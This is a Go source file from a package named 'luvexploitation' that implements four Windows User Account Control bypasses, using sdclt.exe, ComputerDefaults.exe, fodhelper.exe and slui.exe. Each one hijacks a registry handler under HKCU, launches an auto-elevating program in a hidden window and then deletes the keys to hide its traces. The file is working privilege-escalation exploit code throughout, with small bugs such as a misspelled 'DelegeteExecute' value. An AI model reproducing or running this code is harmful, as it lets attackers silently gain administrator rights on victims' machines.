package luvexploitation

import (
	"errors"
	"golang.org/x/sys/windows/registry"
	"os/exec"
	"syscall"
	"time"
)

//https://github.com/rootm0s/WinPwnage see here for more info about these functions

// TryEscalate attempts bypasses to User Account Control of Windows and escalates
// privileges to root if User has root privileges
//Returns true if successful
func TryEscalate(path string) (success bool, err error) {
	if err != nil {
		return
	}
	if ComputerDefaults(path) == nil {
		return true, nil
	}
	if SdcltControl(path) == nil {
		return true, nil
	}
	if FodHelper(path) == nil {
		return true, nil
	}
	if SluiEscalate(path) == nil {
		return true, nil
	}

	return false, errors.New("uac bypass failed")
}

//SdcltControl is a UAC bypass method that uses the sdclt.exe program to bypass UAC, works on Windows 10
func SdcltControl(path string) error {

	var cmd *exec.Cmd

	key, _, err := registry.CreateKey(
		registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`,
		registry.SET_VALUE)
	if err != nil {
		return err
	}

	if err := key.SetStringValue("", path); err != nil {
		return err
	}

	if err := key.Close(); err != nil {
		return err
	}

	time.Sleep(2200 * time.Millisecond)

	cmd = exec.Command("cmd", "/C", "start sdclt.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		return err
	}
	time.Sleep(5200 * time.Millisecond)

	err = registry.DeleteKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`)
	if err != nil {
		return err
	}

	return nil
}

// ComputerDefaults is a UAC bypass method that uses the ComputerDefaults.exe program to bypass UAC, works on Windows 10
func ComputerDefaults(path string) (err error) {
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`, registry.QUERY_VALUE|registry.SET_VALUE)

	if err != nil {
		return
	}
	err = key.SetStringValue("", path)
	if err != nil {
		return
	}
	err = key.SetStringValue("DelegateExecute", "")
	if err != nil {
		return
	}
	err = key.Close()
	if err != nil {
		return
	}
	time.Sleep(2200 * time.Millisecond)

	var cmd = exec.Command("cmd", "/C", "start computerdefaults.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		return
	}

	time.Sleep(5200 * time.Millisecond)
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings`)
	return
}

// FodHelper is a UAC bypass method that uses the Fodhelper.exe program to bypass UAC, works on Windows 10
func FodHelper(path string) (err error) {

	key, _, err := registry.CreateKey(
		registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`,
		registry.SET_VALUE)
	if err != nil {
		return
	}
	err = key.SetStringValue("", path)
	if err != nil {
		return
	}
	err = key.SetStringValue("DelegeteExecute", "")
	if err != nil {
		return
	}
	err = key.Close()
	if err != nil {
		return
	}
	time.Sleep(2200 * time.Millisecond)

	var cmd = exec.Command("start fodhelper.exe")
	err = cmd.Run()
	if err != nil {
		return
	}
	time.Sleep(5200 * time.Millisecond)
	err = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`)
	if err != nil {
		return
	}
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings`)
	return
}

// SluiEscalate is a UAC bypass method that uses the slui.exe program to bypass UAC, works on Windows 10 and Windows 8.1
func SluiEscalate(path string) (err error) {

	key, _, err := registry.CreateKey(
		registry.CURRENT_USER, `Software\Classes\exefile\shell\open\command`,
		registry.SET_VALUE|registry.ALL_ACCESS)

	if err != nil {
		return
	}
	err = key.SetStringValue("", path)
	if err != nil {
		return
	}
	err = key.SetStringValue("DelegateExecute", "")
	if err != nil {
		return
	}
	err = key.Close()
	if err != nil {
		return
	}

	time.Sleep(2200 * time.Millisecond)

	var cmd = exec.Command("slui.exe")
	err = cmd.Run()
	if err != nil {
		return
	}
	time.Sleep(5200 * time.Millisecond)

	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\exefile\`)
	return
}
